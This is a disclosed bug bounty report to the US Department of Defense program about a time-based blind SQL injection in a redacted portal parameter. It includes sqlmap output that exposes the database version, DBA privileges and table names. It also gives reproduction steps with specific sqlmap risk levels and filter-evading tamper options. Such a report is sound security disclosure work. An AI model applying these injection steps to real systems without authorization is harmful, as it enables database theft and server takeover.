# Followup - SQL Injection - https://██████████/██████/MSI.portal

## Report Details
- **Report ID**: 692326
- **URL**: https://hackerone.com/reports/692326
- **State**: Closed
- **Severity**: high
- **Submitted**: 2019-09-11T14:11:58.088Z
- **Disclosed**: 2020-05-14T17:07:19.205Z

## Reporter
- **Username**: arkaic
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
**Summary:**

Time based blind sql injection for parameter MSI_additionalFilterType1, at the following URL:

https://███/███/MSI.portal?_nfpb=true&_pageLabel=msi_portal_page_61

**Description:**

This is a follow up to a previous report I submitted:

https://hackerone.com/reports/674838


The following page has a form parameter which is vulnerable to time based blind sql injection, which allows an attacker to retrieve information from the database.

https://█████████/███/MSI.portal?_nfpb=true&_pageLabel=msi_portal_page_61

The page uses several hidden parameters which are sent when the form is submitted. The specific vulnerable parameter in this case is "MSI_additionalFilterType1".

Sample form POST data, prior to SQL injection testing:

https://█████████/█████/msi/query_results.jsp?MSI_additionalFilterType1=-999&MSI_additionalFilterType2=-999&MSI_additionalFilterValue1=-999&MSI_additionalFilterValue2=-999&MSI_generalFilterType=-999&MSI_generalFilterValue=-999&MSI_outputOptionType1=-999&MSI_outputOptionType2=-999&MSI_outputOptionValue1=-999&MSI_outputOptionValue2=-999&MSI_queryType=-999


Initially I was not able to retrieve details about the database user nor the schema. After adjusting several parameters for sqlmap, I was able to successfully do so.

Here we can see the specific edition of Oracle DB used, along with the user and database name:

████

```
banner: 'Oracle Database 11g Enterprise Edition Release 11.2.0.3.0 - 64bit Production'
[13:11:58] [INFO] fetching current user
[13:11:58] [INFO] retrieved: ███
current user: '██████████'
[13:13:17] [INFO] testing if current user is DBA
current user is DBA: True
[13:13:25] [WARNING] schema names are going to be used on Oracle for enumeration as the counterpart to database names on other DBMSes
[13:13:25] [INFO] fetching database (schema) names
[13:13:25] [INFO] fetching number of databases
[13:13:25] [INFO] retrieved: 
[13:13:29] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
[13:13:29] [ERROR] unable to retrieve the number of databases
[13:13:29] [INFO] falling back to current database
[13:13:29] [INFO] fetching current database
[13:13:29] [INFO] retrieved: ███
[13:14:48] [WARNING] on Oracle you'll need to use schema names for enumeration as the counterpart to database names on other DBMSes
available databases [1]:
[*] ██████████
```
Here you can see the retrieval of a few table names from the database:

█████

```
[13:18:06] [INFO] fetching tables for database: '█████'
[13:18:06] [INFO] fetching number of tables for database '████'
multi-threading is considered unsafe in time-based data retrieval. Are you sure of your choice (breaking warranty) [y/N] 
[13:18:08] [INFO] retrieved: 
[13:18:14] [INFO] adjusting time delay to 3 seconds due to good response times
67
[13:18:32] [INFO] retrieved: ████████
[13:19:54] [INFO] retrieved: ███████
[13:23:29] [INFO] retrieved: ██████████
[13:25:45] [INFO] retrieved: ████████
[13:28:37] [INFO] retrieved: ██████████
```
I interrupted the process at this point, so as to not enumerate all 67 table names, and ceased further testing.


## Impact

High

## Step-by-step Reproduction Instructions

1. Visit the vulnerable url (https://███/██████/MSI.portal?_nfpb=true&_pageLabel=msi_portal_page_61) while using an intercepting proxy
2. Intercept GET request to capture full URL and all form parameters
3. Utilize sqlmap to detect and exploit sql injection in "MSI_additionalFilterType1" parameter

Note: The default configuration of sqlmap will not be able to find the sql injection. I adjusted the following parameters in order to do so.  "--risk 2 --level 3" and "--tamper=space2comment,randomcase,between"



## Product, Version, and Configuration (If applicable)

## Suggested Mitigation/Remediation Actions

1. Sanitize all form parameter inputs, and use whitelisting to allow only needed data
2. Rate limit submissions of forms. Time based sql injection requires many more HTTP requests than would be seen from legitimate browser activity.

## Impact

High/Critical impact.

This sql injection attack could be used to retrieve all information from the database. Also, the account is running with DBA privileges which would allow for the retrieval of database account passwords and takeover of the server itself via injection of system commands; these could be leveraged to attack other systems on the network and potential lateral movement to other systems.

## Attachments
No attachments
